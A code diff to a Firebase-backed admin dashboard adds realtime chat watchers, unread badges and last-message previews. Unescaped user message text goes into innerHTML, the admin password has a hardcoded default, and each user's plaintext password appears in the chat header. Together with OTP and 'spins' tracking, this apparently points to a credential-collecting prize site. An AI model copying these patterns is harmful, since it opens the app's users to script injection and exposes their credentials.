@@ -249,6 +249,9 @@ let selectedChatUser = null;
 let adminChatListener = null;
 let adminPendingImgs = [];
 let iphoneModeState = false;
+let chatUnread = {};        // { userId: true/false }
+let chatLastMsg = {};       // { userId: lastMessageText }
+let allChatListeners = {};  // { userId: listenerRef } - realtime per-user chat watchers
 
 // ── Admin Login ───────────────────────────────────────────────────────────────
 function getAdminPw(){return localStorage.getItem(ADMIN_PW_KEY)||'admin2024';}
@@ -288,8 +291,27 @@ function initDashboard(){
     usersData=snap.val()||{};
     filteredUsers=Object.entries(usersData);
     renderUserList(filteredUsers);
-    renderChatUserList();
     updateStats();
+    // Attach chat watchers for any new users
+    Object.keys(usersData).forEach(uid=>attachChatWatcher(uid));
+  });
+}
+
+// Watch every user's chat for new messages (unread badge)
+function attachChatWatcher(userId){
+  if(allChatListeners[userId]) return; // already watching
+  allChatListeners[userId] = db.ref('chats/'+userId).orderByChild('timestamp').limitToLast(1).on('value',snap=>{
+    if(!snap.val()) return;
+    const msgs = Object.values(snap.val());
+    const last = msgs[msgs.length-1];
+    if(!last) return;
+    const preview = last.text ? last.text.slice(0,30) : (last.image?'📷 ဓာတ်ပုံ':'');
+    chatLastMsg[userId] = preview;
+    // Mark unread if: message is from user AND not currently viewing this chat
+    if(last.from==='user' && userId!==selectedChatUser){
+      chatUnread[userId] = true;
+    }
+    renderChatUserList();
   });
 }
 
@@ -443,13 +465,32 @@ function deleteUser(userId){
 // ── Chat ──────────────────────────────────────────────────────────────────────
 function renderChatUserList(){
   const list=document.getElementById('chat-user-list'); list.innerHTML='';
-  Object.entries(usersData).forEach(([userId,user])=>{
+  // Sort: unread first, then by userId
+  const entries = Object.entries(usersData).sort(([a],[b])=>{
+    if(chatUnread[a]&&!chatUnread[b]) return -1;
+    if(!chatUnread[a]&&chatUnread[b]) return 1;
+    return 0;
+  });
+  const totalUnread = Object.values(chatUnread).filter(Boolean).length;
+  // Update Chat tab button label
+  const chatTab = document.getElementById('tab-chat');
+  if(chatTab) chatTab.innerHTML = totalUnread>0 ? `💬 Chat <span style="background:#FF3B30;color:#fff;font-size:10px;font-weight:900;padding:1px 6px;border-radius:20px;margin-left:3px;">${totalUnread}</span>` : '💬 Chat';
+  entries.forEach(([userId,user])=>{
+    const hasUnread = chatUnread[userId]||false;
+    const lastMsg = chatLastMsg[userId]||'';
+    const isActive = userId===selectedChatUser;
     const item=document.createElement('div');
-    item.style.cssText='padding:10px 12px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.05);transition:background .15s;';
-    item.innerHTML=`<div style="font-weight:700;font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${user.phone||userId}</div><div style="color:rgba(255,255,255,.3);font-size:10px;margin-top:1px;">${user.otpVerified?'✅ Verified':'⏳ Pending'}</div>`;
-    item.onmouseenter=()=>{if(userId!==selectedChatUser)item.style.background='rgba(255,255,255,.03)';};
-    item.onmouseleave=()=>{if(userId!==selectedChatUser)item.style.background='';};
-    if(userId===selectedChatUser){item.style.background='rgba(0,119,230,.1)';item.style.borderLeft='3px solid #0077E6';}
+    item.style.cssText=`padding:10px 12px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.05);transition:background .15s;position:relative;${isActive?'background:rgba(0,119,230,.1);border-left:3px solid #0077E6;':''}`;
+    item.innerHTML=`
+      <div style="display:flex;align-items:center;justify-content:space-between;gap:6px;">
+        <div style="font-weight:${hasUnread?'900':'700'};font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:${hasUnread?'#fff':'rgba(255,255,255,.85)'};">${user.phone||userId}</div>
+        ${hasUnread?'<div style="min-width:8px;height:8px;border-radius:50%;background:#FF3B30;flex-shrink:0;box-shadow:0 0 6px #FF3B3099;animation:pulse 1.5s ease-in-out infinite;"></div>':''}
+      </div>
+      <div style="color:rgba(255,255,255,.3);font-size:10px;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">
+        ${lastMsg||( user.otpVerified?'✅ Verified':'⏳ Pending')}
+      </div>`;
+    item.onmouseenter=()=>{if(!isActive)item.style.background='rgba(255,255,255,.04)';};
+    item.onmouseleave=()=>{if(!isActive)item.style.background='';};
     item.onclick=()=>openChatWith(userId);
     item.id='chat-user-item-'+userId;
     list.appendChild(item);
@@ -460,6 +501,9 @@ function openChatWith(userId){
   switchTab('chat');
   if(adminChatListener&&selectedChatUser){db.ref('chats/'+selectedChatUser).off('value');adminChatListener=null;}
   selectedChatUser=userId;
+  // Clear unread for this user
+  chatUnread[userId]=false;
+  renderChatUserList();
   const user=usersData[userId]||{};
   iphoneModeState=user.iphoneMode||false;
   // Update header
@@ -469,11 +513,7 @@ function openChatWith(userId){
   document.getElementById('chat-header-name').textContent=user.phone||userId;
   document.getElementById('chat-header-sub').textContent=`🔑 ${user.password||'-'} · Spins: ${user.spinsLeft!=null?user.spinsLeft:3}`;
   updateIphoneToggleUI();
-  // Highlight in sidebar
-  document.querySelectorAll('[id^="chat-user-item-"]').forEach(el=>{el.style.background='';el.style.borderLeft='none';});
-  const item=document.getElementById('chat-user-item-'+userId);
-  if(item){item.style.background='rgba(0,119,230,.1)';item.style.borderLeft='3px solid #0077E6';}
-  // Load messages
+  // Load messages realtime
   const msgs=document.getElementById('chat-msgs-admin'); msgs.innerHTML='';
   adminChatListener=db.ref('chats/'+userId).orderByChild('timestamp').limitToLast(100).on('value',snap=>{
     msgs.innerHTML='';
